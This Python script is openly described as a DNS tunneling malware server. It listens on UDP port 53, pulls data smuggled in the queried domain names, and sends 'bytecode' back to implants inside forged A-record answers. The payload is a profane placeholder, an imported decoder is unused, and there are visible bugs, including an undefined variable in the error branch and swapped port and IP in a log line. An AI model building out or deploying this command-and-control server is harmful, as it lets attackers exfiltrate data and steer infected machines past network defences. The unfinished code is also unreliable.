#!/usr/bin/env python3

import argparse
import logging
import socket

from lib.data_decoder import Decoder

DNS_PORT = 53

class MalwareServer:
    def __init__(self, ip='0.0.0.0', port=DNS_PORT, level=logging.INFO):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.logger = self.__get_logger(level)

    def __get_logger(self, level):
        logger = logging.getLogger('MalwareServer')
        logger.setLevel(level)
        console_handler = logging.StreamHandler()
        formatter = logging.Formatter(
            '%(asctime)s: %(levelname)s - %(message)s')
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        return logger

    def __get_domain(self, data):
        domain = ''
        ini = 12
        lon = ord(data[ini])
        while lon != 0:
            domain += data[ini+1:ini+lon+1]
            ini += lon + 1
            lon = ord(data[ini])
        return domain

    def __get_dns_response(self, data, bytecode):
        assert type(bytecode) is str and len(bytecode) == 4
        # Header bytes
        packet = data[:2] + '\x81\x80'
        # Questions and Answers Counts
        packet += data[4:6] + data[4:6] + '\x00\x00\x00\x00'
        # Original Domain Name Question
        packet += data[12:]
        # Pointer to domain name
        packet += '\xc0\x0c'
        # Response type, ttl and resource data length -> 4 bytes
        packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
        # 4 bytes of IP
        return packet + bytecode

    def response(self, data, ip):
        # Opcode bits
        query_type = (ord(data[2]) >> 3) & 15
        if query_type == 0:
            self.logger.info('Data received from {}'.format(ip))
            domain = self.__get_domain(data)
            # Bytecode response placeholder
            packet = self.__get_dns_response(data, 'fuck')
            return packet
        else:
            self.logger.error(
                'Invalid DNS query received from {}'.format(address))

    def run(self):
        self.server.bind((self.ip, self.port))
        self.logger.info('Starting server on {}:{}'.format(self.port, self.ip))
        try:
            while True:
                data, address = self.server.recvfrom(1024)
                ip, port = address
                self.server.sendto(self.response(data, ip), address)
        except KeyboardInterrupt:
            self.logger.info('Shutting down server!')
            self.server.close()

if __name__ == '__main__':
    log_levels = {
        'CRITICAL': logging.CRITICAL,
        'ERROR': logging.ERROR,
        'WARNING': logging.WARNING,
        'INFO': logging.INFO,
        'DEBUG': logging.DEBUG
    }

    parser = argparse.ArgumentParser(description='DNS tunneling malware server')
    parser.add_argument('--port', type=int, default=53,
                        help='the port to bind to, defaults to 53')
    parser.add_argument('--level', choices=log_levels.keys(), default='INFO',
                        help='the logging level, defaults to INFO')
    args = parser.parse_args()
    server = MalwareServer(port=args.port, level=log_levels[args.level])
    server.run()
